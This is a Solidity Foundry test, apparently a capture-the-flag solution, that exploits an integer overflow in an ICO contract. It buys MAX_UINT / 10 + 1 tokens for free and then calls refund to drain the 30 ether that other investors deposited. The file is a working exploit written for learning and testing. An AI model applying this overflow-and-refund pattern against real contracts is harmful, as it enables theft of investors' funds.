// SPDX-License-Identifier: MIT
pragma abicoder v2;
pragma solidity ^0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {AIvestICO} from "../../src/ao-3/AIvestICO.sol";
import {IERC20} from "../../src/ao-3/AIvestToken.sol";

contract SimpleTokenkTest is Test {

    address deployer = makeAddr("deployer");
    address investorOne = makeAddr("investorOne");
    address investorTwo = makeAddr("investorTwo");
    address investorThree = makeAddr("investorThree");
    address attacker = makeAddr("you");

    AIvestICO vestICO;

    uint256 constant DEPLOYER_INIT_TOKENS = 100000;
    uint256 constant INIT_ETH = 10 ether;
    uint256 constant INIT_TOKENS = 10 ether;
    uint256 constant MAX_UINT = type(uint256).max;

    function setUp() public {
        vm.startPrank(deployer);
        vestICO = new AIvestICO();
        vm.stopPrank();

        hoax(investorOne, INIT_ETH);
        vestICO.buy{value: 10 ether}(INIT_TOKENS * 10);
        hoax(investorTwo, INIT_ETH);
        vestICO.buy{value: 10 ether}(INIT_TOKENS * 10);
        hoax(investorThree, INIT_ETH);
        vestICO.buy{value: 10 ether}(INIT_TOKENS * 10);
        vm.deal(attacker, 1 ether);

        // victim deposits funds
        // hoax(victim, VICTIM_INITIAL_BALANCE);
        // timelock.depositETH{value: VICTIM_DEPOSIT}();
    }

    function testAttack() public {
        assertEq(IERC20(address(vestICO.token())).balanceOf(investorOne), INIT_TOKENS * 10);
        assertEq(IERC20(address(vestICO.token())).balanceOf(investorTwo), INIT_TOKENS * 10);
        assertEq(IERC20(address(vestICO.token())).balanceOf(investorThree), INIT_TOKENS * 10);

        assertEq(address(vestICO).balance, 30 ether);
        vm.startPrank(attacker);

        uint256 tokensToBuy = MAX_UINT / 10 + 1;
        vestICO.buy(tokensToBuy);
        assertEq(IERC20(address(vestICO.token())).balanceOf(attacker), tokensToBuy);
        
        // exploit
        vestICO.refund(30 ether * 10);
        assertEq(address(vestICO).balance, 0 ether);
        assertTrue(attacker.balance >= 30 ether);
    
        vm.stopPrank();
    }

}